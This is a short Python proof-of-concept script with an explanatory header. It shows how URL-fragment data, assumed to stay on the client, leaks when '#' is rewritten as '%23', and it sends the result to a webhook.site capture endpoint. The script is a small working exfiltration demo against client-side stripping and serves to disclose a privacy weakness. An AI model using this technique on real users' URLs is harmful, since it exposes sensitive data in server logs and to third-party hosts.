# Exploitation of personally identifiable information in URL Fragment
# Reference: 
# https://curl.se/mail/lib-2011-11/0178.html
# https://what.thedailywtf.com/topic/19087/uri-fragment-sent-to-server/12
# 
# URL fragments are not sent to the server as they are 
# only used by the client-side browser to navigate within 
# the same page. But in case of embedded systems and devices 
# it is very handy to put information in the fragment as a
# sub-resource of the actual resource under request.
# Eg: http://example.com/resource.html#sub-resource
# Also such implementations take advantage of the client side 
# http libraries (Python requests, curl etc) feature of stripping 
# the URL fragment before forwarding the request to the Server.
# In some cases the fragment also contains sensitive information
# and assumes that the client side will strip this information 
# before consuming the URL. This can be exploited to cause security 
# and privacy issues by simply breaking the client sides ability to 
# strip down the sensitive information. There by exposing the sensitive
# information in browser histories, URL inspection and web site logs. 
#
# Author: Sreejith.Naarakathil@gmail.com

import requests

# set the URL of the server application and the URL fragment
url = 'https://webhook.site/50315309-941d-4059-89d6-098b76042979?a=1&b=2#12345678'
print('Original URL     :', url)

# intercept the URL and replace # with %23
url = url.replace("#", "%23" )
print('Intercepted URL  :', url)

# set the headers and any other options you need
headers = {'Content-Type': 'application/json'}

# send the GET request to the server with the URL fragment
response = requests.get(url, headers=headers)

# handle the response from the server
if response.status_code == 200:
    print(response.content)
else:
    print('Error:', response.status_code)

# Output:
# Refer document 'URL_Fragment_Vulnerability_exploitation_result.pdf'